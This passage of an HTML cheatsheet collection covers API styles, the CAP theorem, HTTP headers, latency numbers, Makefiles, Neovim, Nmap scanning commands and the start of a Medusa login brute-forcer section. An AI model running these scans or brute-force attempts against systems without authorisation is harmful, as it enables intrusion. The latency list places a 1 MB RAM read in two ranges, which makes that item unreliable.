<li><a href="#operational-amplifiers">Operational Amplifiers</a></li>
<li><a href="#digital-logic-gates">Digital Logic Gates</a></li>
<li><a href="#555-timer-ic">555 Timer IC</a></li>
<li><a href="#microcontrollers">Microcontrollers</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cheatsheets"><a class="header" href="#cheatsheets">Cheatsheets</a></h1>
<h2 id="directory-map"><a class="header" href="#directory-map">Directory Map</a></h2>
<ul>
<li><a href="#api-architectural-styles">api_architecture_styles</a></li>
<li><a href="#cap-theorem">cap_theorem</a></li>
<li><a href="#ffuf-cheatsheet">ffuf</a></li>
<li><a href="#hashcat-cheatsheet">hashcat</a></li>
<li><a href="#standard-http-headers">http_headers</a></li>
<li><a href="#hydra-cheatsheet">hydra</a></li>
<li><a href="#john-the-ripper-cheatsheet">john</a></li>
<li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
<li><a href="#lazagne-cheatsheet">lazagne</a></li>
<li><a href="#make-files">make_files</a></li>
<li><a href="#medusa-cheatsheet">medusa</a></li>
<li><a href="#metasploit-cheatsheet">metasploit</a></li>
<li><a href="#mimikatz-cheatsheet">mimikatz</a></li>
<li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
<li><a href="#ncat-file-transfer">ncat</a></li>
<li><a href="#neovim-cheatsheet">neovim</a></li>
<li><a href="#netcat-file-transfer">netcat</a></li>
<li><a href="#nikto-cheatsheet">nikto</a></li>
<li><a href="#nmap-cheatsheet">nmap</a></li>
<li><a href="#powershell-file-transfer">powershell</a></li>
<li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
<li><a href="#ranger-cheatsheet">ranger</a></li>
<li><a href="#rdp-file-transfer">rdp</a></li>
<li><a href="#regex-cheatsheet">regex</a></li>
<li><a href="#rubeus-cheatsheet">rubeus</a></li>
<li><a href="#server-side-template-injection">server-side template injection</a></li>
<li><a href="#sql-cheat-sheet">sql</a></li>
<li><a href="#ssh-cheatsheet">ssh</a></li>
<li><a href="#unshadow-cheatsheet">unshadow</a></li>
<li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
<li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
<li><a href="#multi-line-strings">yaml</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
<h2 id="rest"><a class="header" href="#rest">REST</a></h2>
<p>Proposed in 2000, REST is the most used style. It is often used between front-end clients and back-end services. It is compliant with 6 architectural constraints. The payload format can be JSON, XML, HTML, or plain text.</p>
<h2 id="graphql"><a class="header" href="#graphql">GraphQL</a></h2>
<p>GraphQL was proposed in 2015 by Meta. It provides a schema and type system, suitable for complex systems where the relationships between entities are graph-like. For example, in the diagram below, GraphQL can retrieve user and order information in one call, while in REST this needs multiple calls.</p>
<p>GraphQL is not a replacement for REST. It can be built upon existing REST services.</p>
<h2 id="web-socket"><a class="header" href="#web-socket">Web Socket</a></h2>
<p>Web socket is a protocol that provides full-duplex communications over TCP. The clients establish web sockets to receive real-time updates from the back-end services. Unlike REST, which always ‚Äúpulls‚Äù data, web socket enables data to be ‚Äúpushed‚Äù.</p>
<h2 id="webhook"><a class="header" href="#webhook">Webhook</a></h2>
<p>Webhooks are usually used by third-party asynchronous API calls. In the diagram below, for example, we use Stripe or Paypal for payment channels and register a webhook for payment results. When a third-party payment service is done, it notifies the payment service if the payment is successful or failed. Webhook calls are usually part of the system‚Äôs state machine.</p>
<h2 id="grpc"><a class="header" href="#grpc">gRPC</a></h2>
<p>Released in 2016, gRPC is used for communications among microservices. gRPC library handles encoding/decoding and data transmission.</p>
<h2 id="soap"><a class="header" href="#soap">SOAP</a></h2>
<p>SOAP stands for Simple Object Access Protocol. Its payload is XML only, suitable for communications between internal systems.</p>
<p><img src="cheatsheets/images/api_arch_styles/styles.png" alt=""></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cap-theorem"><a class="header" href="#cap-theorem">cap theorem</a></h1>
<p>CAP theorem states that it is impossible for a distributed system to provide more than two of these guarantees: consistency, availability, and partition tolerance.</p>
<ul>
<li>Consistency
<ul>
<li>All clients see the same data at the same time from any node
<img src="cheatsheets/images/cap_theorem/consistency.png" alt=""></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>
<p>Availability</p>
<ul>
<li>The ability for a system to respond to requests from users at all times</li>
</ul>
<p><img src="cheatsheets/images/cap_theorem/availability.png" alt=""></p>
</li>
</ul>
<hr>
<ul>
<li>
<p>Partition Tolerance</p>
<ul>
<li>The ability for a system to continue operating even if there is a partition in the network</li>
</ul>
<p><img src="cheatsheets/images/cap_theorem/partition_tolerance.png" alt=""></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="standard-http-headers"><a class="header" href="#standard-http-headers">standard http headers</a></h1>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Header</th><th>Example</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>A-IM</td><td>A-IM: feed</td><td>Instance manipulations that are acceptable in the response. Defined in RFC 3229</td></tr>
<tr><td>Accept</td><td>Accept: application/json</td><td>The media type/types acceptable</td></tr>
<tr><td>Accept-Charset</td><td>Accept-Charset: utf-8</td><td>The charset acceptable</td></tr>
<tr><td>Accept-Encoding</td><td>Accept-Encoding: gzip, deflate</td><td>List of acceptable encodings</td></tr>
<tr><td>Accept-Language</td><td>Accept-Language: en-US</td><td>List of acceptable languages</td></tr>
<tr><td>Accept-Datetime</td><td>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</td><td>Request a past version of the resource prior to the datetime passed</td></tr>
<tr><td>Access-Control-Request-Method</td><td>Access-Control-Request-Method: GET</td><td>Used in a CORS request</td></tr>
<tr><td>Access-Control-Request-Headers</td><td>Access-Control-Request-Headers: origin, x-requested-with, accept</td><td>Used in a CORS request</td></tr>
<tr><td>Authorization</td><td>Authorization: Basic 34i3j4iom2323==</td><td>HTTP basic authentication credentials</td></tr>
<tr><td>Cache-Control</td><td>Cache-Control: no-cache</td><td>Set the caching rules</td></tr>
<tr><td>Connection</td><td>Connection: keep-alive</td><td>Control options for the current connection. Accepts keep-alive and close. Deprecated in HTTP/2</td></tr>
<tr><td>Content-Length</td><td>Content-Length: 348</td><td>The length of the request body in bytes</td></tr>
<tr><td>Content-Type</td><td>Content-Type: application/x-www-form-urlencoded</td><td>The content type of the body of the request (used in POST and PUT requests)</td></tr>
<tr><td>Cookie</td><td>Cookie: name=value</td><td>https://flaviocopes.com/cookies/</td></tr>
<tr><td>Date</td><td>Date: Tue, 15 Nov 1994 08:12:31 GMT</td><td>The date and time that the request was sent</td></tr>
<tr><td>Expect</td><td>Expect: 100-continue</td><td>It‚Äôs typically used when sending a large request body. We expect the server to return back a 100 Continue HTTP status if it can handle the request, or 417 Expectation Failed if not</td></tr>
<tr><td>Forwarded</td><td>Forwarded: for=192.0.2.60; proto=http; by=203.0.113.43</td><td>Disclose original information of a client connecting to a web server through an HTTP proxy. Used for testing purposes only, as it discloses privacy sensitive information</td></tr>
<tr><td>From</td><td>From: user@example.com</td><td>The email address of the user making the request. Meant to be used, for example, to indicate a contact email for bots.</td></tr>
<tr><td>Host</td><td>Host: flaviocopes.com</td><td>The domain name of the server (used to determined the server with virtual hosting), and the TCP port number on which the server is listening. If the port is omitted, 80 is assumed. This is a mandatory HTTP request header</td></tr>
<tr><td>If-Match</td><td>If-Match: ‚Äú737060cd8c284d8582d‚Äù</td><td>Given one (or more) ETags, the server should only send back the response if the current resource matches one of those ETags. Mainly used in PUT methods to update a resource only if it has not been modified since the user last updated it</td></tr>
<tr><td>If-Modified-Since</td><td>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</td><td>Allows to return a 304 Not Modified response header if the content is unchanged since that date</td></tr>
<tr><td>If-None-Match</td><td>If-None-Match: ‚Äú737060cd882f209582d‚Äù</td><td>Allows a 304 Not Modified response header to be returned if content is unchanged. Opposite of If-Match.</td></tr>
<tr><td>If-Range</td><td>If-Range: ‚Äú737060cd8c9582d‚Äù</td><td>Used to resume downloads, returns a partial if the condition is matched (ETag or date) or the full resource if not</td></tr>
<tr><td>If-Unmodified-Since</td><td>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</td><td>Only send the response if the entity has not been modified since the specified time</td></tr>
<tr><td>Max-Forwards</td><td>Max-Forwards: 10</td><td>Limit the number of times the message can be forwarded through proxies or gateways</td></tr>
<tr><td>Origin</td><td>Origin: http://mydomain.com</td><td>Send the current domain to perform a CORS request, used in an OPTIONS HTTP request (to ask the server for Access-Control- response headers)</td></tr>
<tr><td>Pragma</td><td>Pragma: no-cache</td><td>Used for backwards compatibility with HTTP/1.0 caches</td></tr>
<tr><td>Proxy-Authorization</td><td>Proxy-Authorization: Basic 2323jiojioIJOIOJIJ==</td><td>Authorization credentials for connecting to a proxy</td></tr>
<tr><td>Range</td><td>Range: bytes=500-999</td><td>Request only a specific part of a resource</td></tr>
<tr><td>Referer</td><td>Referer: https://flaviocopes.com</td><td>The address of the previous web page from which a link to the currently requested page was followed.</td></tr>
<tr><td>TE</td><td>TE: trailers, deflate</td><td>Specify the encodings the client can accept. Accepted values: compress, deflate, gzip, trailers. Only trailers is supported in HTTP/2</td></tr>
<tr><td>User-Agent</td><td>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</td><td>The string that identifies the user agent</td></tr>
<tr><td>Upgrade</td><td>Upgrade: h2c, HTTPS/1.3, IRC/6.9, RTA/x11, websocket</td><td>Ask the server to upgrade to another protocol. Deprecated in HTTP/2</td></tr>
<tr><td>Via</td><td>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</td><td>Informs the server of proxies through which the request was sent</td></tr>
<tr><td>Warning</td><td>Warning: 199 Miscellaneous warning</td><td>A general warning about possible problems with the status of the message. Accepts a special range of values.</td></tr>
<tr><td>Dnt</td><td>DNT: 1</td><td>If enabled, asks servers to not track the user</td></tr>
<tr><td>X-CSRF-Token</td><td>X-CSRF-Token: <token></token></td><td>Used to prevent CSRF</td></tr>
</tbody>
</table>
</div>
<h2 id="cache-control"><a class="header" href="#cache-control">Cache-Control</a></h2>
<p>The Cache-Control header is used to specify directives for caching mechanisms in both requests and responses. Here are some common directives that can be used with the Cache-Control header:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Directive</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>no-cache</td><td>Forces caches to submit the request to the origin server for validation before releasing a cached copy.</td></tr>
<tr><td>no-store</td><td>Instructs caches not to store any part of the request or response.</td></tr>
<tr><td>public</td><td>Indicates that the response may be cached by any cache, even if it would</td></tr>
<tr><td>private</td><td>Indicates that the response is intended for a single user and should not be stored by shared caches.</td></tr>
<tr><td>max-age=<seconds></seconds></td><td>Specifies the maximum amount of time a resource is considered fresh.</td></tr>
<tr><td>stale-while-revalidate=<seconds></seconds></td><td>Allows a cache to serve a stale response while it revalidates it in the background.</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="latency-numbers-every-sre-should-know"><a class="header" href="#latency-numbers-every-sre-should-know">Latency Numbers Every SRE Should Know</a></h1>
<p>nanosecond = 1/1,000,000,000 second
microsecond = 1/1,000,000 second
millisecond = 1/1000 second</p>
<h2 id="sub-nanosecond-range"><a class="header" href="#sub-nanosecond-range">Sub-Nanosecond Range</a></h2>
<ul>
<li>Accessing CPU registers</li>
<li>CPU Clock Cycle</li>
</ul>
<h2 id="1-10-nanosecond-range"><a class="header" href="#1-10-nanosecond-range">1-10 Nanosecond Range</a></h2>
<ul>
<li>L1/L2 cache</li>
<li>Branch Misprediction in CPU pipelining</li>
</ul>
<h2 id="10-100-nanosecond-range"><a class="header" href="#10-100-nanosecond-range">10-100 Nanosecond Range</a></h2>
<ul>
<li>L3 cache</li>
<li>Apple M1 referencing main memory (RAM)</li>
</ul>
<h2 id="100-1000-nanosecond-range"><a class="header" href="#100-1000-nanosecond-range">100-1000 Nanosecond Range</a></h2>
<ul>
<li>System call on Linux</li>
<li>MD5 hash a 64-bit number</li>
</ul>
<h2 id="1-10-microsecond-range"><a class="header" href="#1-10-microsecond-range">1-10 Microsecond Range</a></h2>
<ul>
<li>Context switching between Linux threads</li>
</ul>
<h2 id="10-100-microsecond-range"><a class="header" href="#10-100-microsecond-range">10-100 Microsecond Range</a></h2>
<ul>
<li>Process a HTTP request</li>
<li>Reading 1 megabyte of sequential data from RAM</li>
<li>Read an 8k page from an ssd</li>
</ul>
<h2 id="100-1000-microsecond-range"><a class="header" href="#100-1000-microsecond-range">100-1000 Microsecond Range</a></h2>
<ul>
<li>SSD write Latency</li>
<li>Intra-zone networking round trip in most cloud providers</li>
<li>Memcache/Redis get operation</li>
</ul>
<h2 id="1-10-millisecond-range"><a class="header" href="#1-10-millisecond-range">1-10 Millisecond Range</a></h2>
<ul>
<li>Inter-zone networking Latency</li>
<li>Seek time of a HDD</li>
</ul>
<h2 id="10-100-millisecond-range"><a class="header" href="#10-100-millisecond-range">10-100 Millisecond Range</a></h2>
<ul>
<li>Network round trip between US-west and US-east coast</li>
<li>Read 1 megabyte sequentially from main memory</li>
</ul>
<h2 id="100-1000-millisecond-range"><a class="header" href="#100-1000-millisecond-range">100-1000 Millisecond Range</a></h2>
<ul>
<li>Some encryption/hashing algorithms</li>
<li>TLS handshake</li>
<li>Read 1 Gigabyte sequentially from an SSD</li>
</ul>
<h2 id="1-second"><a class="header" href="#1-second">1 second+</a></h2>
<ul>
<li>Transfer 1GB over a cloud network within the same region</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="make-files"><a class="header" href="#make-files">Make Files</a></h1>
<h2 id="why-do-make-files-exist"><a class="header" href="#why-do-make-files-exist">Why do Make files exist?</a></h2>
<p>Make files are used for automation. Typically as a step in the software development lifecycle (compilation, builds, etc.). However, they can be used for any other task that can be automated via the shell.</p>
<p><strong>Make files must be indented using tabs, not spaces</strong></p>
<h2 id="makefile-syntax"><a class="header" href="#makefile-syntax">Makefile Syntax</a></h2>
<p>Makefiles consist of a set of rules. Rules typically look like this:</p>
<pre><code>targets: prerequisites
	command
	command
	command
</code></pre>
<ul>
<li>The targets are file names, separated by spaces. Typically, there is only 1 per rule.</li>
<li>The commands are a series of steps typically used to make targets.</li>
<li>The prerequisites are also file names, separated by spaces. These files need to exist before the commands for the target are run. These are dependencies to the targets.</li>
</ul>
<h2 id="example"><a class="header" href="#example">Example</a></h2>
<p>Let‚Äôs start with a hello world example:</p>
<pre><code>hello:
	echo "Hello, World"
	echo "This line will print if the file hello does not exist."
</code></pre>
<p>There‚Äôs already a lot to take in here. Let‚Äôs break it down:</p>
<ul>
<li>We have one target called hello</li>
<li>This target has two commands</li>
<li>This target has no prerequisites</li>
</ul>
<p>We‚Äôll then run make hello. As long as the hello file does not exist, the commands will run. If hello does exist, no commands will run. It‚Äôs important to realize that I‚Äôm talking about hello as both a target and a file. That‚Äôs because the two are directly tied together. Typically, when a target is run (aka when the commands of a target are run), the commands will create a file with the same name as the target. In this case, the hello target does not create the hello file.</p>
<p>Let‚Äôs create a more typical Makefile - one that compiles a single C file. But before we do, make a file called blah.c that has the following contents:</p>
<pre><code>// blah.c
int main() { return 0; }
</code></pre>
<p>Then create the Makefile (called Makefile, as always):</p>
<pre><code>blah:
	cc blah.c -o blah
</code></pre>
<p>This time, try simply running make. Since there‚Äôs no target supplied as an argument to the make command, the first target is run. In this case, there‚Äôs only one target (blah). The first time you run this, blah will be created. The second time, you‚Äôll see make: ‚Äòblah‚Äô is up to date. That‚Äôs because the blah file already exists. But there‚Äôs a problem: if we modify blah.c and then run make, nothing gets recompiled.</p>
<p>We solve this by adding a prerequisite:</p>
<pre><code>blah: blah.c
	cc blah.c -o blah
</code></pre>
<p>When we run make again, the following set of steps happens:</p>
<ul>
<li>The first target is selected, because the first target is the default target</li>
<li>This has a prerequisite of blah.c</li>
<li>Make decides if it should run the blah target. It will only run if blah doesn‚Äôt exist, or blah.c is newer than blah</li>
</ul>
<p>This last step is critical, and is the essence of make. What it‚Äôs attempting to do is decide if the prerequisites of blah have changed since blah was last compiled. That is, if blah.c is modified, running make should recompile the file. And conversely, if blah.c has not changed, then it should not be recompiled.</p>
<p>To make this happen, it uses the filesystem timestamps as a proxy to determine if something has changed. This is a reasonable heuristic, because file timestamps typically will only change if the files are modified. But it‚Äôs important to realize that this isn‚Äôt always the case. You could, for example, modify a file, and then change the modified timestamp of that file to something old. If you did, Make would incorrectly guess that the file hadn‚Äôt changed and thus could be ignored.</p>
<h2 id="make-clean"><a class="header" href="#make-clean">Make Clean</a></h2>
<p>clean is often used as a target that removes the output of other targets, but it is not a special word in Make. You can run make and make clean on this to create and delete some_file.</p>
<p>Note that clean is doing two new things here:</p>
<ul>
<li>It‚Äôs a target that is not first (the default), and not a prerequisite. That means it‚Äôll never run unless you explicitly call make clean</li>
<li>It‚Äôs not intended to be a filename. If you happen to have a file named clean, this target won‚Äôt run, which is not what we want. See .PHONY later in this tutorial on how to fix this</li>
</ul>
<pre><code>some_file: 
	touch some_file

clean:
	rm -f some_file
</code></pre>
<h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
<p>Variables can only be strings. You‚Äôll typically want to use :=, but = also works.</p>
<p>Here‚Äôs an example of using variables:</p>
<pre><code>files := file1 file2
some_file: $(files)
	echo "Look at this variable: " $(files)
	touch some_file

file1:
	touch file1
file2:
	touch file2

clean:
	rm -f file1 file2 some_file
</code></pre>
<h1 id="targets"><a class="header" href="#targets">targets</a></h1>
<h2 id="the-all-target"><a class="header" href="#the-all-target">The ‚Äòall‚Äô target</a></h2>
<p>Making multiple targets and you want all of them to run? Make an all target. Since this is the first rule listed, it will run by default if make is called without specifying a target.</p>
<pre><code>all: one two three

one:
	touch one
two:
	touch two
three:
	touch three

clean:
	rm -f one two three
</code></pre>
<h2 id="multiple-targets"><a class="header" href="#multiple-targets">Multiple targets</a></h2>
<p>When there are multiple targets for a rule, the commands will be run for each target. <code>$@</code> is an automatic variable that contains the target name.</p>
<pre><code>all: f1.o f2.o

f1.o f2.o:
	echo $@
# Equivalent to:
# f1.o:
#	 echo f1.o
# f2.o:
#	 echo f2.o
</code></pre>
<h1 id="reference"><a class="header" href="#reference">Reference</a></h1>
<h3 id="var-assignment"><a class="header" href="#var-assignment">Var assignment</a></h3>
<pre><code class="language-makefile">foo  = "bar"
bar  = $(foo) foo  # dynamic (renewing) assignment
foo := "boo"       # one time assignment, $(bar) now is "boo foo"
foo ?= /usr/local  # safe assignment, $(foo) and $(bar) still the same
bar += world       # append, "boo foo world"
foo != echo fooo   # exec shell command and assign to foo
# $(bar) now is "fooo foo world"
</code></pre>
<p><code>=</code> expressions are only evaluated when they‚Äôre being used.</p>
<h3 id="magic-variables"><a class="header" href="#magic-variables">Magic variables</a></h3>
<pre><code class="language-makefile">out.o: src.c src.h
  $@   # "out.o" (target)
  $&lt;   # "src.c" (first prerequisite)
  $^   # "src.c src.h" (all prerequisites)

%.o: %.c
  $*   # the 'stem' with which an implicit rule matches ("foo" in "foo.c")

also:
  $+   # prerequisites (all, with duplication)
  $?   # prerequisites (new ones)
  $|   # prerequisites (order-only?)

  $(@D) # target directory
</code></pre>
<h3 id="command-prefixes"><a class="header" href="#command-prefixes">Command prefixes</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Prefix</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-</code></td><td>Ignore errors</td></tr>
<tr><td><code>@</code></td><td>Don‚Äôt print command</td></tr>
<tr><td><code>+</code></td><td>Run even if Make is in ‚Äòdon‚Äôt execute‚Äô mode</td></tr>
</tbody>
</table>
</div>
<pre><code class="language-makefile">build:
    @echo "compiling"
    -gcc $&lt; $@

-include .depend
</code></pre>
<h3 id="find-files"><a class="header" href="#find-files">Find files</a></h3>
<pre><code class="language-makefile">js_files  := $(wildcard test/*.js)
all_files := $(shell find images -name "*")
</code></pre>
<h3 id="substitutions"><a class="header" href="#substitutions">Substitutions</a></h3>
<pre><code class="language-makefile">file     = $(SOURCE:.cpp=.o)   # foo.cpp =&gt; foo.o
outputs  = $(files:src/%.coffee=lib/%.js)

outputs  = $(patsubst %.c, %.o, $(wildcard *.c))
assets   = $(patsubst images/%, assets/%, $(wildcard images/*))
</code></pre>
<h3 id="more-functions"><a class="header" href="#more-functions">More functions</a></h3>
<pre><code class="language-makefile">$(strip $(string_var))

$(filter %.less, $(files))
$(filter-out %.less, $(files))
</code></pre>
<h3 id="building-files"><a class="header" href="#building-files">Building files</a></h3>
<pre><code class="language-makefile">%.o: %.c
  ffmpeg -i $&lt; &gt; $@   # Input and output
  foo $^
</code></pre>
<h3 id="includes"><a class="header" href="#includes">Includes</a></h3>
<pre><code class="language-makefile">-include foo.make
</code></pre>
<h3 id="options"><a class="header" href="#options">Options</a></h3>
<pre><code class="language-sh">make
  -e, --environment-overrides
  -B, --always-make
  -s, --silent
  -j, --jobs=N   # parallel processing
</code></pre>
<h3 id="conditionals"><a class="header" href="#conditionals">Conditionals</a></h3>
<pre><code class="language-makefile">foo: $(objects)
ifeq ($(CC),gcc)
  $(CC) -o foo $(objects) $(libs_for_gcc)
else
  $(CC) -o foo $(objects) $(normal_libs)
endif
</code></pre>
<h3 id="recursive"><a class="header" href="#recursive">Recursive</a></h3>
<pre><code class="language-makefile">deploy:
  $(MAKE) deploy2
</code></pre>
<h3 id="further-reading"><a class="header" href="#further-reading">Further reading</a></h3>
<ul>
<li><a href="https://gist.github.com/isaacs/62a2d1825d04437c6f08">isaacs‚Äôs Makefile</a></li>
<li><a href="https://tech.davis-hansson.com/p/make/">Your Makefiles are wrong</a></li>
<li><a href="https://www.gnu.org/software/make/manual/html_node/index.html">Manual</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="neovim-cheatsheet"><a class="header" href="#neovim-cheatsheet">Neovim Cheatsheet</a></h1>
<h2 id="mode-switching"><a class="header" href="#mode-switching">Mode Switching:</a></h2>
<ul>
<li>i: Insert mode before cursor</li>
<li>I: Insert mode at the beginning of line</li>
<li>a: Insert mode after cursor</li>
<li>A: Insert mode at the end of line</li>
<li>v: Visual mode</li>
<li>V: Visual line mode</li>
<li>^V (Ctrl + V): Visual block mode</li>
<li>:q: Quit (add ! to force)</li>
<li>:w: Save/write</li>
<li>:wq or ZZ: Save and Quit</li>
</ul>
<h2 id="cursor-movement"><a class="header" href="#cursor-movement">Cursor Movement:</a></h2>
<ul>
<li>h: Left</li>
<li>j: Down</li>
<li>k: Up</li>
<li>l: Right</li>
<li>w: Jump by start of words</li>
<li>e: Jump to end of words</li>
<li>b: Jump backward by words</li>
<li>0: Start of line</li>
<li>$: End of line</li>
<li>G: Go to last line of document</li>
<li>gg: Go to first line of document</li>
<li>^: First non-blank character of line</li>
<li>: followed by a number: Go to that line number (e.g., :10)</li>
</ul>
<h2 id="editing"><a class="header" href="#editing">Editing:</a></h2>
<ul>
<li>u: Undo</li>
<li>^R (Ctrl + R): Redo</li>
<li>yy or Y: Yank/copy line</li>
<li>dd: Delete line</li>
<li>D: Delete from cursor to end of line</li>
<li>x: Delete character under cursor</li>
<li>p: Paste after cursor</li>
<li>P: Paste before cursor</li>
<li>r followed by a character: Replace character under cursor with the new character</li>
<li>cw: Change word</li>
</ul>
<h2 id="search-and-replace"><a class="header" href="#search-and-replace">Search and Replace:</a></h2>
<ul>
<li>/ followed by a term: Search for term (press n to go to next and N for previous)</li>
<li>:%s/old/new/g: Replace all occurrences of ‚Äúold‚Äù with ‚Äúnew‚Äù in the entire file</li>
</ul>
<h2 id="windows--tabs"><a class="header" href="#windows--tabs">Windows &amp; Tabs:</a></h2>
<ul>
<li>^W (Ctrl + W) followed by h/j/k/l: Move cursor to another window</li>
<li>:split or :sp: Split window horizontally</li>
<li>:vsplit or :vsp: Split window vertically</li>
<li>:tabnew or :tabn: Create a new tab</li>
<li>gt: Move to next tab</li>
<li>gT: Move to previous tab</li>
</ul>
<h2 id="others"><a class="header" href="#others">Others:</a></h2>
<ul>
<li>.: Repeat last command</li>
<li>*: Search for word under cursor</li>
<li>#: Search for word under cursor, backwards</li>
<li>~: Switch case of character under cursor</li>
<li>o: Insert new line below and enter insert mode</li>
<li>O: Insert new line above and enter insert mode</li>
<li>
<blockquote>
<blockquote>
<p>: Indent line</p>
</blockquote>
</blockquote>
</li>
<li>&lt;&lt;: Dedent line</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nmap-cheatsheet"><a class="header" href="#nmap-cheatsheet">Nmap Cheatsheet</a></h1>
<h2 id="basic-scan-types"><a class="header" href="#basic-scan-types">Basic Scan Types</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Scan</th><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><strong>Ping Scan</strong></td><td><code>nmap -sn &lt;target&gt;</code></td><td>Check if host is up.</td></tr>
<tr><td><strong>SYN Scan</strong></td><td><code>nmap -sS &lt;target&gt;</code></td><td>Stealthy fast TCP scan.</td></tr>
<tr><td><strong>Service Version Scan</strong></td><td><code>nmap -sV &lt;target&gt;</code></td><td>Scan service version of open ports.</td></tr>
<tr><td><strong>Connect Scan</strong></td><td><code>nmap -sT &lt;target&gt;</code></td><td>Full TCP handshake; accurate but noisy.</td></tr>
<tr><td><strong>UDP Scan</strong></td><td><code>nmap -sU &lt;target&gt;</code></td><td>Scan UDP ports (slow).</td></tr>
<tr><td><strong>Version Scan</strong></td><td><code>nmap -sV &lt;target&gt;</code></td><td>Identify service versions.</td></tr>
<tr><td><strong>OS Detection</strong></td><td><code>nmap -O &lt;target&gt;</code></td><td>Guess OS.</td></tr>
<tr><td><strong>Aggressive Scan</strong></td><td><code>nmap -A &lt;target&gt;</code></td><td>OS, version, scripts, traceroute.</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="port-selection"><a class="header" href="#port-selection">Port Selection</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Meaning</th></tr>
</thead>
<tbody>
<tr><td><code>-p 22</code></td><td>Scan one port</td></tr>
<tr><td><code>-p 22,80,443</code></td><td>Scan list</td></tr>
<tr><td><code>-p 1-65535</code></td><td>Scan range</td></tr>
<tr><td><code>-p-</code></td><td>Scan all ports</td></tr>
<tr><td><code>--top-ports=10</code></td><td>Scan most common ports</td></tr>
<tr><td><code>-F</code></td><td>Fast scan (top 100)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="important-flags"><a class="header" href="#important-flags">Important Flags</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Flag</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-Pn</code></td><td>No host discovery; treat host as up</td></tr>
<tr><td><code>-n</code></td><td>No DNS resolution</td></tr>
<tr><td><code>--disable-arp-ping</code></td><td>Disable ARP ping</td></tr>
<tr><td><code>--packet-trace</code></td><td>Show all sent/received packets</td></tr>
<tr><td><code>--reason</code></td><td>Explain port states</td></tr>
<tr><td><code>-T4</code></td><td>Faster timing template</td></tr>
<tr><td><code>--stats-every=5s	</code></td><td>Show stats every 5 seconds</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="port-states"><a class="header" href="#port-states">Port States</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>State</th><th>Meaning</th></tr>
</thead>
<tbody>
<tr><td><strong>open</strong></td><td>Accepts connections</td></tr>
<tr><td><strong>closed</strong></td><td>Responds with RST</td></tr>
<tr><td><strong>filtered</strong></td><td>Blocked by firewall</td></tr>
<tr><td><strong>unfiltered</strong></td><td>Reachable, state unknown</td></tr>
<tr><td><strong>open|filtered</strong></td><td>No response</td></tr>
<tr><td><strong>closed|filtered</strong></td><td>Idle scan ambiguity</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-examples"><a class="header" href="#useful-examples">Useful Examples</a></h2>
<h3 id="scan-top-10-tcp-ports"><a class="header" href="#scan-top-10-tcp-ports">Scan Top 10 TCP Ports</a></h3>
<pre><code>nmap --top-ports=10 &lt;target&gt;
</code></pre>
<h3 id="full-tcp--udp--version--os"><a class="header" href="#full-tcp--udp--version--os">Full TCP + UDP + Version + OS</a></h3>
<pre><code>nmap -sS -sU -sV -O &lt;target&gt;
</code></pre>
<h3 id="packet-trace-example"><a class="header" href="#packet-trace-example">Packet Trace Example</a></h3>
<pre><code>nmap -p 21 --packet-trace -Pn -n --disable-arp-ping &lt;target&gt;
</code></pre>
<h3 id="service-enumeration"><a class="header" href="#service-enumeration">Service Enumeration</a></h3>
<pre><code>nmap -sV -p &lt;port&gt; &lt;target&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="medusa-cheatsheet"><a class="header" href="#medusa-cheatsheet">Medusa Cheatsheet</a></h1>
<p>Medusa is a fast, massively parallel, and modular login brute-forcer designed to support a wide array of services that allow remote authentication.</p>
<h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
<pre><code class="language-bash">sudo apt-get -y update
sudo apt-get -y install medusa
</code></pre>
<h2 id="command-syntax"><a class="header" href="#command-syntax">Command Syntax</a></h2>
<pre><code class="language-bash">medusa [target_options] [credential_options] -M module [module_options]
</code></pre>
<h2 id="parameters"><a class="header" href="#parameters">Parameters</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Parameter</th><th>Explanation</th><th>Usage Example</th></tr>
</thead>
<tbody>
<tr><td><code>-h HOST</code></td><td>Target: Single hostname or IP address</td><td><code>medusa -h 192.168.1.10 ...</code></td></tr>
